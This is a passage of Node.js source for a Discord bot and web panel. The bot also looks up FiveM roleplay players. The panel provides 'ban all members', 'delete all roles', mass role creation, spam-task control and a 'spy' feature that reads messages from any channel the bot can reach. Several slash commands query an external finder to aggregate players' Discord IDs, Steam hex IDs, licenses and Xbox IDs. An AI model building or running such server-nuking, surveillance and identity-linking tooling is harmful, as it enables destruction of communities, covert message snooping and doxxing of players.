    spamTask = null;
    res.status(500).json({ error: error.message });
  }
});

// Stop all tasks
app.post("/api/stop", requireAuth, (req, res) => {
  if (createTask) createTask.running = false;
  if (spamTask) spamTask.running = false;
  createTask = null;
  spamTask = null;
  res.json({ success: true });
});

// Create Roles
app.post("/api/roles/create", requireAuth, async (req, res) => {
  const { guildId, roleName, count, colorType, customColor, deleteBefore } = req.body;
  if (!guildId || !roleName || !count) return res.status(400).json({ error: "Missing fields" });
  
  const numCount = parseInt(count);
  if (isNaN(numCount) || numCount < 1) return res.status(400).json({ error: "Invalid count" });
  
  try {
    const guild = await client.guilds.fetch(guildId);
    if (!guild) return res.status(404).json({ error: "Server not found" });
    
    let deletedCount = 0;
    
    // Delete ALL existing roles if requested (except @everyone and bot's highest role)
    if (deleteBefore) {
      await guild.roles.fetch();
      const botMember = await guild.members.fetch(client.user.id);
      const botHighestRole = botMember.roles.highest.position;
      
      // Get all deletable roles sorted by position (lowest first to avoid issues)
      const rolesToDelete = guild.roles.cache
        .filter(r => r.name !== '@everyone' && r.position < botHighestRole && !r.managed)
        .sort((a, b) => a.position - b.position);
      
      for (const [id, role] of rolesToDelete) {
        try {
          await role.delete();
          deletedCount++;
          await new Promise(r => setTimeout(r, 100));
        } catch (e) { 
          console.error(`Failed to delete role ${role.name}:`, e.message);
        }
      }
    }
    
    let created = 0;
    
    for (let i = 1; i <= numCount; i++) {
      try {
        const name = roleName.replace(/{n}/g, i).replace(/{num}/g, i);
        let color;
        if (colorType === 'custom' && customColor) {
          color = parseInt(customColor.replace('#', ''), 16);
        } else {
          color = Math.floor(Math.random() * 16777215);
        }
        await guild.roles.create({ name, color });
        created++;
        await new Promise(r => setTimeout(r, 200));
      } catch (e) { console.error(`Failed to create role ${i}:`, e.message); }
    }
    
    res.json({ success: true, created, requested: numCount, deleted: deletedCount || undefined });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Update Server Settings
app.post("/api/server/update", requireAuth, async (req, res) => {
  const { guildId, name, icon, description } = req.body;
  if (!guildId) return res.status(400).json({ error: "Missing guildId" });
  
  try {
    const guild = await client.guilds.fetch(guildId);
    if (!guild) return res.status(404).json({ error: "Server not found" });
    
    const updates = {};
    
    if (name) updates.name = name;
    if (description !== undefined) updates.description = description;
    
    // Handle icon from URL
    if (icon) {
      try {
        const response = await axios.get(icon, { responseType: 'arraybuffer', timeout: 10000 });
        const base64 = Buffer.from(response.data).toString('base64');
        const mimeType = response.headers['content-type'] || 'image/png';
        updates.icon = `data:${mimeType};base64,${base64}`;
      } catch (e) {
        return res.status(400).json({ error: "Failed to fetch icon from URL" });
      }
    }
    
    if (Object.keys(updates).length === 0) {
      return res.status(400).json({ error: "No changes to apply" });
    }
    
    await guild.edit(updates);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Spy - Get Channels
app.get("/api/spy/channels", requireAuth, async (req, res) => {
  const { guildId } = req.query;
  if (!guildId) return res.status(400).json({ error: "Missing guildId" });
  
  try {
    const guild = await client.guilds.fetch(guildId);
    if (!guild) return res.status(404).json({ error: "Server not found" });
    
    await guild.channels.fetch();
    const channels = guild.channels.cache
      .filter(c => c.type !== 4) // Exclude categories
      .sort((a, b) => a.position - b.position)
      .map(c => ({
        id: c.id,
        name: c.name,
        type: c.type,
        position: c.position
      }));
    
    res.json({ success: true, channels });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get Bot Servers
app.get("/api/servers", requireAuth, async (req, res) => {
  try {
    const servers = client.guilds.cache.map(g => ({
      id: g.id,
      name: g.name,
      icon: g.iconURL({ size: 128 }),
      memberCount: g.memberCount,
      channelCount: g.channels.cache.size,
      roleCount: g.roles.cache.size
    }));
    
    res.json({ success: true, servers });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Spy - Get Messages
app.get("/api/spy/messages", requireAuth, async (req, res) => {
  const { channelId, before } = req.query;
  if (!channelId) return res.status(400).json({ error: "Missing channelId" });
  
  try {
    const channel = await client.channels.fetch(channelId);
    if (!channel) return res.status(404).json({ error: "Channel not found" });
    if (!channel.isTextBased()) return res.status(400).json({ error: "Not a text channel" });
    
    const options = { limit: 50 };
    if (before) options.before = before;
    
    const messages = await channel.messages.fetch(options);
    
    const formattedMessages = await Promise.all(messages.map(async m => {
      // Get interaction info (slash command with full command)
      let interaction = null;
      if (m.interaction) {
        // Try to get full command from message content or build from interaction
        let commandFull = m.interaction.commandName;
        // Check if message has content that looks like a command
        if (m.content && m.content.startsWith('/')) {
          commandFull = m.content.substring(1);
        }
        interaction = {
          name: m.interaction.commandName,
          commandFull: commandFull,
          user: m.interaction.user.username
        };
      }
      
      // Get reply reference with more info
      let reference = null;
      if (m.reference && m.reference.messageId) {
        try {
          const refMsg = await channel.messages.fetch(m.reference.messageId);
          if (refMsg) {
            reference = {
              author: refMsg.author.username,
              content: refMsg.content,
              avatar: refMsg.author.displayAvatarURL({ size: 32 }),
              id: refMsg.author.id
            };
          }
        } catch (e) {
          reference = { author: 'Unknown', content: 'Message not found', avatar: null };
        }
      }
      
      // Format embeds
      const embeds = m.embeds.map(e => ({
        title: e.title,
        description: e.description,
        url: e.url,
        color: e.hexColor || '#5865f2',
        author: e.author ? {
          name: e.author.name,
          iconURL: e.author.iconURL,
          url: e.author.url
        } : null,
        thumbnail: e.thumbnail ? { url: e.thumbnail.url } : null,
        image: e.image ? { url: e.image.url } : null,
        footer: e.footer ? {
          text: e.footer.text,
          iconURL: e.footer.iconURL
        } : null,
        timestamp: e.timestamp,
        fields: e.fields.map(f => ({
          name: f.name,
          value: f.value,
          inline: f.inline
        }))
      }));
      
      // Format stickers
      const stickers = m.stickers.map(s => ({
        name: s.name,
        url: s.url
      }));
      
      return {
        id: m.id,
        content: m.content,
        timestamp: m.createdTimestamp,
        author: {
          id: m.author.id,
          username: m.author.username,
          avatar: m.author.displayAvatarURL({ size: 64 }),
          bot: m.author.bot
        },
        attachments: m.attachments.map(a => ({
          name: a.name,
          url: a.url,
          contentType: a.contentType,
          size: a.size
        })),
        embeds,
        stickers,
        interaction,
        reference
      };
    }));
    
    res.json({ success: true, messages: formattedMessages });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Delete All Roles
app.post("/api/roles/delete-all", requireAuth, async (req, res) => {
  const { guildId } = req.body;
  if (!guildId) return res.status(400).json({ error: "Missing guildId" });
  
  try {
    const guild = await client.guilds.fetch(guildId);
    if (!guild) return res.status(404).json({ error: "Server not found" });
    
    await guild.roles.fetch();
    const botMember = await guild.members.fetch(client.user.id);
    const botHighestRole = botMember.roles.highest.position;
    
    const rolesToDelete = guild.roles.cache
      .filter(r => r.name !== '@everyone' && r.position < botHighestRole && !r.managed)
      .sort((a, b) => b.position - a.position);
    
    const totalDeletable = rolesToDelete.size;
    const totalRoles = guild.roles.cache.size - 1;
    const skipped = totalRoles - totalDeletable;
    
    let deleted = 0;
    for (const [id, role] of rolesToDelete) {
      try {
        await role.delete();
        deleted++;
        await new Promise(r => setTimeout(r, 150));
      } catch (e) {
        console.error('Failed to delete role:', role.name, e.message);
      }
    }
    
    res.json({ success: true, deleted, total: totalRoles, skipped });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Ban All Members
app.post("/api/ban-all", requireAuth, async (req, res) => {
  const { guildId } = req.body;
  if (!guildId) return res.status(400).json({ error: "Missing guildId" });
  
  try {
    const guild = await client.guilds.fetch(guildId);
    if (!guild) return res.status(404).json({ error: "Server not found" });
    
    await guild.members.fetch();
    const members = guild.members.cache;
    let banned = 0;
    const total = members.size;
    
    for (const [id, member] of members) {
      if (member.bannable && !member.user.bot) {
        try {
          await member.ban({ reason: "Ban All - Panel" });
          banned++;
          await new Promise(r => setTimeout(r, 150));
        } catch (e) { console.error(`Failed to ban ${id}:`, e.message); }
      }
    }
    
    res.json({ success: true, banned, total });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get("/", (req, res) => res.redirect("/login"));
app.listen(port, "0.0.0.0", () => console.log(`Web Panel: http://localhost:${port}`));

// Discord Client
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

// Commands
const commands = [
  new SlashCommandBuilder()
    .setName('search')
    .setDescription('Search for a specific player on DiamondRP server')
    .addIntegerOption(opt => opt.setName('id').setDescription('Player ID to search for').setRequired(true)),
  new SlashCommandBuilder()
    .setName('hex')
    .setDescription('Search for player identifiers (Discord ID, Steam Hex, License, etc.)')
    .addStringOption(opt => opt.setName('identifier').setDescription('Enter Discord ID, Steam Hex, Username, License, License2, Live, XBL, or FiveM ID').setRequired(true)),
  new SlashCommandBuilder()
    .setName('onlyhex')
    .setDescription('Search and display only unique Steam Hex identifiers')
    .addStringOption(opt => opt.setName('identifier').setDescription('Enter Discord ID, Steam Hex, Username, License, License2, Live, XBL, or FiveM ID').setRequired(true)),
  new SlashCommandBuilder()
    .setName('players')
    .setDescription('Show list of all online players on the server'),
  new SlashCommandBuilder()
    .setName('ping')
    .setDescription('Check bot status')
];

// Register commands
const rest = new REST({ version: '10' }).setToken(BOT_TOKEN);

client.once("ready", async () => {
  console.log(`Bot online: ${client.user.tag}`);
  
  try {
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
    console.log('Commands registered!');
  } catch (error) {
    console.error('Failed to register commands:', error);
  }
});

client.on("interactionCreate", async (interaction) => {
  if (!interaction.isChatInputCommand()) return;
  
  try {
    // Check user ban
    if (isUserBanned(interaction.user.id)) {
      return interaction.reply({ content: getUserBanMessage(interaction.user.id), ephemeral: true });
    }
    
    // Check channel ban
    if (interaction.channelId && isChannelBanned(interaction.channelId)) {
      return interaction.reply({ content: getBanMessage(interaction.channelId), ephemeral: true });
    }
    
    // Check guild ban
    if (interaction.guildId && isGuildBanned(interaction.guildId)) {
      return interaction.reply({ content: getGuildBanMessage(interaction.guildId), ephemeral: true });
    }
    
    const { commandName } = interaction;
    console.log('Command received:', commandName);
    
    if (commandName === 'ping') {
      const embed = new EmbedBuilder()
        .setTitle('🏓 Pong!')
        .setDescription('```diff\n+ Online\n```')
        .setColor(0x00ff00)
        .addFields({
          name: 'Bot Status',
          value: `- **Latency:** \`${client.ws.ping}ms\`\n- **Status:** \`Online\`\n- **Uptime:** \`${Math.floor(client.uptime/1000/60)} minutes\``,
          inline: false
        })
        .setFooter({ text: 'Developed by AghaDaNi' });
      await interaction.reply({ embeds: [embed] });
      return;
    }
  
  if (commandName === 'search') {
    const playerId = interaction.options.getInteger('id');
    
    console.log(`🔍 Search Request:`);
    console.log(`   User ID: ${interaction.user.id}`);
    console.log(`   Username: ${interaction.user.username}`);
    console.log(`   Searched Player ID: ${playerId}`);
    console.log(`   Guild: ${interaction.guild?.name || "DM"}`);
    console.log(`   Time: ${getIranTime().toLocaleString()}`);
    console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
    
    await interaction.deferReply();
    
    try {
      let response;
      try {
        response = await axios.get(API_URL, { timeout: 15000 });
      } catch (firstError) {
        console.log(`🔄 Retrying API call for Player ID '${playerId}'...`);
        response = await axios.get(API_URL, { timeout: 20000 });
      }
      
      const players = response.data;
      
      addSearchLog({
        type: 'search',
        userId: interaction.user.id,
        username: interaction.user.username,
        channelId: interaction.channelId,
        channelName: interaction.channel?.name,
        guildName: interaction.guild?.name,
        query: playerId.toString(),
        success: true,
        result: 'searched'
      });
      
      if (!players || players.length === 0) {
        const noPlayersEmbed = new EmbedBuilder()
          .setTitle("Player Search Result")
          .setDescription("```diff\n- Server Empty\n```")
          .setColor(0xffaa00)
          .addFields({
            name: "Server Information",
            value: `- **Server:** \`Diamond RolePlay\`\n- **Status:** \`Empty\`\n- **Players:** \`0\`\n- **Last Check:** <t:${Math.floor(Date.now() / 1000)}:R>\n- **Error:** \`No players online\``,
            inline: false
          })
          .setFooter({ text: "Developed by AghaDaNi" });
        
        return interaction.editReply({ embeds: [noPlayersEmbed] });
      }
      
      const player = players.find(p => p.id === playerId);
      
      if (!player) {
        const notFoundEmbed = new EmbedBuilder()
          .setTitle("Player Search Result")
          .setDescription("```diff\n- Offline\n```")
          .setColor(0xff0000)
          .addFields({
            name: "Player Information",
            value: `- **Player ID:** \`${playerId}\`\n- **Name:** \`Not Found\`\n- **Status:** \`Offline\`\n- **Playing On:** \`Diamond RolePlay\`\n- **Error:** \`Player not in server or Server error\``,
            inline: false
          })
          .setFooter({ text: "Developed by AghaDaNi" });
        
        return interaction.editReply({ embeds: [notFoundEmbed] });
      }
      
      const name = player.name || "Unknown";
      const ping = player.ping || 0;
      const joinedAt = player.joinedAt ? new Date(player.joinedAt) : new Date();
      
      const embed = new EmbedBuilder()
        .setTitle("Player Search Result")
        .setDescription("```diff\n+ Online\n```")
        .setColor(0x00ff00)
        .addFields({
          name: "Player Information",
          value: `- **Player ID:** \`${playerId}\`\n- **Name:** \`${name}\`\n- **Ping:** \`${ping} ms\`\n- **Playing On:** \`Diamond RolePlay\`\n- **Joined At:** <t:${Math.floor(joinedAt.getTime() / 1000)}:R>`,
          inline: false
        })
        .setFooter({ text: "Developed by AghaDaNi" });
      
      await interaction.editReply({ embeds: [embed] });
      console.log(`✅ Search Result: Player '${name}' (ID: ${playerId}) found with ping ${ping}ms`);
      
    } catch (error) {
      console.log(`⚠️ API failed for Player ID '${playerId}' - User: ${interaction.user.username}`);
      const errorEmbed = new EmbedBuilder()
        .setTitle("Player Search Result")
        .setDescription("```diff\n- Error\n```")
        .setColor(0xffaa00)
        .addFields({
          name: "Error Information",
          value: `- **Server:** \`Diamond RolePlay\`\n- **Status:** \`Connection Timeout\`\n- **Error:** \`Server response too slow\`\n- **Time:** <t:${Math.floor(Date.now() / 1000)}:R>`,
          inline: false
        })
        .setFooter({ text: "Developed by AghaDaNi" });
      
      try {
        await interaction.editReply({ embeds: [errorEmbed] });
      } catch (e) {
        await interaction.followUp({ embeds: [errorEmbed] }).catch(() => {});
      }
    }
  }
  
  if (commandName === 'hex') {
    const identifier = interaction.options.getString('identifier');
    
    console.log(`🔍 Hex Search Request:`);
    console.log(`   User ID: ${interaction.user.id}`);
    console.log(`   Username: ${interaction.user.username}`);
    console.log(`   Searched Identifier: ${identifier}`);
    console.log(`   Guild: ${interaction.guild?.name || "DM"}`);
    console.log(`   Time: ${getIranTime().toLocaleString()}`);
    console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
    
    await interaction.deferReply();
    
    try {
      let response;
      try {
        response = await axios.get(`https://game-tools.ir/api/player-finder?query=${encodeURIComponent(identifier)}&page=1&perPage=100`, { timeout: 20000 });
      } catch (firstError) {
        console.log(`🔄 Retrying API call for identifier '${identifier}'...`);
        response = await axios.get(`https://game-tools.ir/api/player-finder?query=${encodeURIComponent(identifier)}&page=1&perPage=100`, { timeout: 25000 });
      }
      
      const data = response.data;
      
      addSearchLog({
        type: 'hex',
        userId: interaction.user.id,
        username: interaction.user.username,
        channelId: interaction.channelId,
        channelName: interaction.channel?.name,
        guildName: interaction.guild?.name,
        query: identifier,
        success: data.accounts?.length > 0,
        result: `${data.accounts?.length || 0} اکانت`
      });
      
      if (!data.accounts || data.accounts.length === 0) {
        const notFoundEmbed = new EmbedBuilder()
          .setTitle("Identifier Search Result")
          .setDescription("```diff\n- Not Found\n```")
          .setColor(0xff0000)
          .addFields({
            name: "Information",
            value: `- **Searched Identifier:** \`${identifier}\`\n- **Status:** \`Not Found\`\n- **Total Results:** \`0\`\n- **Error:** \`No accounts found with this identifier\``,
            inline: false
          })
          .setFooter({ text: "Developed by AghaDaNi" });
        
        return interaction.editReply({ embeds: [notFoundEmbed] });
      }
      
      const embeds = [];
      for (let i = 0; i < data.accounts.length; i++) {
        const account = data.accounts[i];
        let playerInfo = "";
        
        if (account.name) playerInfo += `- **Username:** \`${account.name}\`\n`;
        
        if (account.discord) {
          if (account.discord.name) playerInfo += `- **Discord Username:** \`${account.discord.name}\`\n`;
          if (account.discord.displayName) playerInfo += `- **Discord Display Name:** \`${account.discord.displayName}\`\n`;
          if (account.discord.id) playerInfo += `- **Discord ID:** \`${account.discord.id}\`\n`;
        }
        
        if (account.steam) {
          if (account.steam.hex) playerInfo += `- **Steam Hex:** \`${account.steam.hex}\`\n`;
          if (account.steam.name) playerInfo += `- **Steam Username:** \`${account.steam.name}\`\n`;
          if (account.steam.id) playerInfo += `- **Steam ID:** \`${account.steam.id}\`\n`;
          if (account.steam.url) playerInfo += `- **Steam URL:** [Profile](${account.steam.url})\n`;
        }
        
        if (account.license) playerInfo += `- **License:** \`${account.license}\`\n`;
        if (account.license2) playerInfo += `- **License2:** \`${account.license2}\`\n`;
        if (account.live) playerInfo += `- **Live:** \`${account.live}\`\n`;
        if (account.xbl) playerInfo += `- **XBL:** \`${account.xbl}\`\n`;
        if (account.fivem) playerInfo += `- **FiveM:** \`${account.fivem}\`\n`;
        
        if (account.playTimes && account.playTimes.length > 0) {
          const playTime = account.playTimes[0];
          const hours = Math.floor(playTime.playTime / 60);
          const minutes = playTime.playTime % 60;
          playerInfo += `\n**Server Information:**\n`;
          playerInfo += `- **Server:** \`${playTime.server.name}\`\n`;
          playerInfo += `- **Play Time:** \`${hours}h ${minutes}m\`\n`;
        }
        
        if (!playerInfo) playerInfo = "- **Error:** `No information found`";
        
        const embed = new EmbedBuilder()
          .setTitle(`Identifier Search Result - Account ${i + 1}/${data.count}`)
          .setDescription("```diff\n+ Found\n```")
          .setColor(0x00ff00)
          .addFields({ name: "Player Information", value: playerInfo, inline: false })
          .setFooter({ text: "Developed by AghaDaNi" });
        
        if (account.discord?.avatar) embed.setThumbnail(account.discord.avatar);
        else if (account.steam?.avatar) embed.setThumbnail(account.steam.avatar);
        
        embeds.push(embed);
      }
      
      await interaction.editReply({ embeds: [embeds[0]] });
      for (let i = 1; i < embeds.length; i++) {
        await interaction.followUp({ embeds: [embeds[i]] });
        if (i < embeds.length - 1) await new Promise(r => setTimeout(r, 500));
      }
      
      console.log(`✅ Hex Search Result: Found ${data.count} account(s) for identifier '${identifier}'`);
      
    } catch (error) {
      let errorDetails = "Unknown error";
      let errorType = "Unknown Error";
      let statusCode = "N/A";
      
      if (error.response) {
        statusCode = error.response.status;
        errorType = `HTTP ${statusCode} Error`;
        errorDetails = error.response.data?.message || error.response.statusText || `Server returned ${statusCode}`;
      } else if (error.request) {
        errorType = "Connection Timeout";
        errorDetails = "Server did not respond in time";
      } else {
        errorType = "Request Error";
        errorDetails = error.message || "Failed to create request";
      }
      
      console.log(`⚠️ API failed for identifier '${identifier}' - User: ${interaction.user.username}`);
      
      const errorEmbed = new EmbedBuilder()
        .setTitle("Identifier Search Result")
        .setDescription("```diff\n- Error\n```")
        .setColor(0xffaa00)
        .addFields({
          name: "Error Information",
          value: `- **Status Code:** \`${statusCode}\`\n- **Error Type:** \`${errorType}\`\n- **Details:** \`${errorDetails}\`\n- **Time:** <t:${Math.floor(Date.now() / 1000)}:R>`,
          inline: false
        })
        .setFooter({ text: "Developed by AghaDaNi" });
      
      try {
        await interaction.editReply({ embeds: [errorEmbed] });
      } catch (e) {
        await interaction.followUp({ embeds: [errorEmbed] }).catch(() => {});
      }
    }
  }
  
  if (commandName === 'onlyhex') {
    const identifier = interaction.options.getString('identifier');
    
    console.log(`🔍 OnlyHex Search Request:`);
    console.log(`   User ID: ${interaction.user.id}`);
    console.log(`   Username: ${interaction.user.username}`);
    console.log(`   Searched Identifier: ${identifier}`);
    console.log(`   Guild: ${interaction.guild?.name || "DM"}`);
    console.log(`   Time: ${getIranTime().toLocaleString()}`);
    console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
    
    await interaction.deferReply();
    
    try {
      let response;
      try {
        response = await axios.get(`https://game-tools.ir/api/player-finder?query=${encodeURIComponent(identifier)}&page=1&perPage=100`, { timeout: 20000 });
      } catch (firstError) {
        console.log(`🔄 Retrying API call for identifier '${identifier}'...`);
        response = await axios.get(`https://game-tools.ir/api/player-finder?query=${encodeURIComponent(identifier)}&page=1&perPage=100`, { timeout: 25000 });
      }
      
      const data = response.data;
      
      addSearchLog({
        type: 'onlyhex',
        userId: interaction.user.id,
        username: interaction.user.username,
        channelId: interaction.channelId,
        channelName: interaction.channel?.name,
        guildName: interaction.guild?.name,
        query: identifier,
        success: data.accounts?.length > 0,
        result: `${data.accounts?.length || 0} اکانت`
      });
      
      if (!data.accounts || data.accounts.length === 0) {
        const notFoundEmbed = new EmbedBuilder()
          .setTitle("Steam Hex Search Result")
          .setDescription("```diff\n- Not Found\n```")
          .setColor(0xff0000)
          .addFields({
            name: "Information",
            value: `- **Searched Identifier:** \`${identifier}\`\n- **Status:** \`Not Found\`\n- **Total Results:** \`0\`\n- **Error:** \`No accounts found with this identifier\``,
            inline: false
          })
          .setFooter({ text: "Developed by AghaDaNi" });
        
        return interaction.editReply({ embeds: [notFoundEmbed] });
      }
      
      const uniqueHexes = new Set();
      const hexData = [];
      
      for (const account of data.accounts) {
        if (account.steam && account.steam.hex) {
          const hex = account.steam.hex;
          if (!uniqueHexes.has(hex)) {
            uniqueHexes.add(hex);
            hexData.push({
              hex: hex,
              steamId: account.steam.id || "N/A",
              steamName: account.steam.name || "N/A",
              steamUrl: account.steam.url || null,
              username: account.name || "N/A"
            });
          }
        }
      }
      
      if (hexData.length === 0) {
        const noHexEmbed = new EmbedBuilder()
          .setTitle("Steam Hex Search Result")
          .setDescription("```diff\n- No Steam Hex Found\n```")
          .setColor(0xff0000)
          .addFields({
            name: "Information",
            value: `- **Searched Identifier:** \`${identifier}\`\n- **Total Accounts:** \`${data.count}\`\n- **Steam Hex Found:** \`0\`\n- **Error:** \`No Steam Hex identifiers in accounts\``,
            inline: false
          })
          .setFooter({ text: "Developed by AghaDaNi" });
        
        return interaction.editReply({ embeds: [noHexEmbed] });
      }
      
      const embeds = [];
      let currentList = "";
      const maxCharsPerEmbed = 900;
      
      for (let i = 0; i < hexData.length; i++) {
        const hd = hexData[i];
        let hexEntry = `**${i + 1}.** \`${hd.hex}\`\n`;
        hexEntry += `   - **Username:** \`${hd.username}\`\n`;
        hexEntry += `   - **Steam ID:** \`${hd.steamId}\`\n`;
        if (hd.steamName !== "N/A") hexEntry += `   - **Steam Name:** \`${hd.steamName}\`\n`;
        if (hd.steamUrl) hexEntry += `   - **Steam URL:** [Profile](${hd.steamUrl})\n`;
        hexEntry += `\n`;
        
        if (currentList.length + hexEntry.length > maxCharsPerEmbed && currentList.length > 0) {
          const embed = new EmbedBuilder()
            .setTitle(`Steam Hex Search Result (Part ${embeds.length + 1})`)
            .setDescription("```diff\n+ Found\n```")
            .setColor(0x00ff00)
            .addFields({ name: `Unique Steam Hex Identifiers`, value: currentList, inline: false })
            .setFooter({ text: "Developed by AghaDaNi" });
          embeds.push(embed);
          currentList = "";
        }
        currentList += hexEntry;
      }
      
      if (currentList.length > 0) {
        const embed = new EmbedBuilder()
          .setTitle(embeds.length > 0 ? `Steam Hex Search Result (Part ${embeds.length + 1})` : "Steam Hex Search Result")
          .setDescription("```diff\n+ Found\n```")
          .setColor(0x00ff00)
          .addFields({ name: `Unique Steam Hex Identifiers (Total: ${hexData.length})`, value: currentList, inline: false })
          .setFooter({ text: "Developed by AghaDaNi" });
        embeds.push(embed);
      }
      
      await interaction.editReply({ embeds: [embeds[0]] });
      for (let i = 1; i < embeds.length; i++) {
        await interaction.followUp({ embeds: [embeds[i]] });
        if (i < embeds.length - 1) await new Promise(r => setTimeout(r, 500));
      }
      
      console.log(`✅ OnlyHex Search Result: Found ${hexData.length} unique Steam Hex(es) for identifier '${identifier}'`);
      
    } catch (error) {
      let errorDetails = "Unknown error";
      let errorType = "Unknown Error";
      let statusCode = "N/A";
      
      if (error.response) {
        statusCode = error.response.status;
        errorType = `HTTP ${statusCode} Error`;
        errorDetails = error.response.data?.message || error.response.statusText || `Server returned ${statusCode}`;
      } else if (error.request) {
        errorType = "Connection Timeout";
        errorDetails = "Server did not respond in time";
      } else {
        errorType = "Processing Error";
        errorDetails = error.message || "Failed to process request";
      }
      
      console.log(`⚠️ API failed for identifier '${identifier}' - User: ${interaction.user.username}`);
      
      const errorEmbed = new EmbedBuilder()
        .setTitle("Steam Hex Search Result")
        .setDescription("```diff\n- Error\n```")
        .setColor(0xffaa00)
        .addFields({
          name: "Error Information",
          value: `- **Status Code:** \`${statusCode}\`\n- **Error Type:** \`${errorType}\`\n- **Details:** \`${errorDetails}\`\n- **Time:** <t:${Math.floor(Date.now() / 1000)}:R>`,
          inline: false
        })
        .setFooter({ text: "Developed by AghaDaNi" });
      
      try {
        await interaction.editReply({ embeds: [errorEmbed] });
      } catch (e) {
        await interaction.followUp({ embeds: [errorEmbed] }).catch(() => {});
      }
    }
  }
  
  if (commandName === 'players') {
    await interaction.deferReply();
    
    try {
      const response = await axios.get(API_URL);
      const players = response.data;
      
      addSearchLog({
        type: 'players',
        userId: interaction.user.id,
        username: interaction.user.username,
        channelId: interaction.channelId,
        channelName: interaction.channel?.name,
        guildName: interaction.guild?.name,
        query: 'players list',
        success: true,
        result: `${players.length} players`
      });
      
      if (!players || players.length === 0) {
        const emptyEmbed = new EmbedBuilder()
          .setTitle('Player List')
          .setDescription('```diff\n- Server Empty\n```')
          .setColor(0xffaa00)
          .addFields({
            name: 'Server Information',
            value: `- **Server:** \`Diamond RolePlay\`\n- **Status:** \`Empty\`\n- **Players:** \`0\``,
            inline: false
          })
          .setFooter({ text: 'Developed by AghaDaNi' });
        
        return interaction.editReply({ embeds: [emptyEmbed] });
      }
      
      // Sort players by ID
      players.sort((a, b) => a.id - b.id);
      
      // Pagination settings
      const perPage = 15;
      const totalPages = Math.ceil(players.length / perPage);
      let currentPage = 0;
      
      const generateEmbed = (page) => {
        const start = page * perPage;
        const end = start + perPage;
        const pagePlayers = players.slice(start, end);
        
        let playerList = '```\n';
        playerList += 'ID   │ Ping   │ Name\n';
        playerList += '─────┼────────┼─────────────────────\n';
        for (const player of pagePlayers) {
          const name = (player.name || 'Unknown').substring(0, 20);
          const id = String(player.id || 0).padStart(4, ' ');
          const ping = String((player.ping || 0) + 'ms').padStart(6, ' ');
          playerList += `${id} │ ${ping} │ ${name}\n`;
        }
        playerList += '```';
        
        return new EmbedBuilder()
          .setTitle('Player List')
          .setDescription(`\`\`\`diff\n+ ${players.length} Players Online\n\`\`\``)
          .setColor(0x00ff00)
          .addFields({
            name: '📋 Online Players',
            value: playerList || 'Empty',
            inline: false
          })
          .setFooter({ text: `Page ${page + 1}/${totalPages} • Developed by AghaDaNi` });
      };
      
      const generateButtons = (page) => {
        return new ActionRowBuilder().addComponents(
          new ButtonBuilder()
            .setCustomId('players_first')
            .setLabel('⏮️')
            .setStyle(ButtonStyle.Secondary)
            .setDisabled(page === 0),
          new ButtonBuilder()
            .setCustomId('players_prev')
            .setLabel('◀️')
            .setStyle(ButtonStyle.Primary)
            .setDisabled(page === 0),
          new ButtonBuilder()
            .setCustomId('players_page')
            .setLabel(`${page + 1}/${totalPages}`)
            .setStyle(ButtonStyle.Secondary)
            .setDisabled(true),
          new ButtonBuilder()
            .setCustomId('players_next')
            .setLabel('▶️')
            .setStyle(ButtonStyle.Primary)
            .setDisabled(page === totalPages - 1),
          new ButtonBuilder()
            .setCustomId('players_last')
            .setLabel('⏭️')
            .setStyle(ButtonStyle.Secondary)
            .setDisabled(page === totalPages - 1)
        );
      };
      
      const msg = await interaction.editReply({ 
        embeds: [generateEmbed(currentPage)], 
        components: totalPages > 1 ? [generateButtons(currentPage)] : [] 
      });
      
      if (totalPages <= 1) return;
      
      const collector = msg.createMessageComponentCollector({ time: 120000 });
      
      collector.on('collect', async (i) => {
        if (i.user.id !== interaction.user.id) {
          return i.reply({ content: '❌ Only the command user can use these buttons!', ephemeral: true });
        }
        
        if (i.customId === 'players_first') currentPage = 0;
        else if (i.customId === 'players_prev') currentPage = Math.max(0, currentPage - 1);
        else if (i.customId === 'players_next') currentPage = Math.min(totalPages - 1, currentPage + 1);
        else if (i.customId === 'players_last') currentPage = totalPages - 1;
        
        await i.update({ 
          embeds: [generateEmbed(currentPage)], 
          components: [generateButtons(currentPage)] 
        });
      });
      
      collector.on('end', () => {
        interaction.editReply({ components: [] }).catch(() => {});
      });
      
    } catch (error) {
      const errorEmbed = new EmbedBuilder()
        .setTitle('Player List')
        .setDescription('```diff\n- Error\n```')
        .setColor(0xff0000)
        .addFields({
          name: 'Error Information',
          value: `- **Server:** \`Diamond RolePlay\`\n- **Status:** \`Connection Error\`\n- **Time:** <t:${Math.floor(Date.now() / 1000)}:R>`,
          inline: false
        })
        .setFooter({ text: 'Developed by AghaDaNi' });
      
      await interaction.editReply({ embeds: [errorEmbed] });
    }
  }
  } catch (err) {
    console.error(`❌ Command Error [${interaction.commandName}]:`);
    console.error(`   User: ${interaction.user?.username} (${interaction.user?.id})`);
    console.error(`   Guild: ${interaction.guild?.name || 'DM'}`);
    console.error(`   Error: ${err.message}`);
    console.error(`   Stack: ${err.stack}`);
    try {
      if (interaction.replied || interaction.deferred) {
        await interaction.followUp({ content: '❌ خطایی رخ داد، لطفا دوباره تلاش کنید', ephemeral: true });
      } else {
        await interaction.reply({ content: '❌ خطایی رخ داد، لطفا دوباره تلاش کنید', ephemeral: true });
      }
    } catch (e) {
      console.error(`   Failed to send error message: ${e.message}`);
    }
  }
});

client.on("error", (error) => {
  console.error("Discord Error:", error.message);
});

process.on('uncaughtException', (error) => {
  console.error('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.error('❌ Uncaught Exception:');
  console.error(`   Message: ${error.message}`);
